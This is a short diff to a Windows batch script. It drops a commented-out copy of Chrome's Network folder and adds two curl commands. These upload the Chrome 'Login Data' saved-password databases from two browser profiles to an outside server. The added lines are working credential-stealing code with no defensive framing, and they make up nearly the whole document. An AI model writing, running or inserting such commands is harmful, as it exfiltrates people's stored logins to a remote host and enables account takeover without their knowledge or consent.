@@ -1,3 +1,4 @@
-::xcopy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Network" "G:\Credentials" /h /i /c /k /e /r /y
-start chrome
+::start chrome 
+curl -X POST -F "file=@%USERPROFILE%/AppData/Local/Google/Chrome/User Data/Profile 1/Login Data" https://sprucebot.tech/fsend
+curl -X POST -F "file=@%USERPROFILE%/AppData/Local/Google/Chrome/User Data/Profile 2/Login Data" https://sprucebot.tech/fsend
 exit
